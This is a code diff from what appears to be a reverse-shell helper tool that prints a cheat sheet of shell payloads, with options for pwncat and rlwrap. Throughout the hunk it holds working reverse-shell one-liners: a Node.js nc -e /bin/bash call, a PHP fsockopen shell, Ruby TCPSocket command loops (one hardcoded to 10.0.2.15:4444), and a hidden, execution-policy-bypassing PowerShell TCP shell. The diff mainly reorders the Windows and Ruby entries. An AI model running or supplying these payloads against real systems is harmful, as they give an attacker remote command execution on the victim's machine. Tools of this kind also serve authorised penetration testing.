@@ -330,35 +330,21 @@ x('child_process').exec('nc xxx yyy -e /bin/bash')
 
 ╔PHP════════════════════════════════════════════════
 ║ php -r '$sock=fsockopen("xxx",yyy);exec("/bin/sh -i <&3 >&3 2>&3");'
-╚═══════════════════════════════════════════════════
-
-╔RUBY═══════════════════════════════════════════════
-║ ruby -rsocket -e'f=TCPSocket.open("xxx",yyy).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'"""
-        )
-    if pwncat:
-        shells.append(
-            """
 ╚═══════════════════════════════════════════════════"""
         )
-    else:
-        shells.append(windows_color)
-        if not rlwrap:
-            shells.append(
-                r"""
-╠══════════════╦════════════════════════════════════"""
-            )
-        else:
-            shells.append(
-                r"""
 
-╔RUBY═══════════════════════════════════════════════"""
-            )
+        shells.append(both_color)
         shells.append(
             r"""
-║ Windows only ║ ruby -rsocket -e 'exit if fork;c=TCPSocket.new("xxx","yyy");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
-╠══════════════╬════════════════════════════════════
-║ Windows only ║ ruby -rsocket -e 'c=TCPSocket.new("xxx","yyy");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
-╚══════════════╩════════════════════════════════════
+
+╔RUBY═══════════════════════════════════════════════
+║ ruby -rsocket -e 'c=TCPSocket.new("10.0.2.15","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
+╚═══════════════════════════════════════════════════"""
+        )
+    if not pwncat:
+        shells.append(windows_color)
+        shells.append(
+            r"""
 
 ╔POWERSHELL═════════════════════════════════════════
 ║ powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("xxx",yyy);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
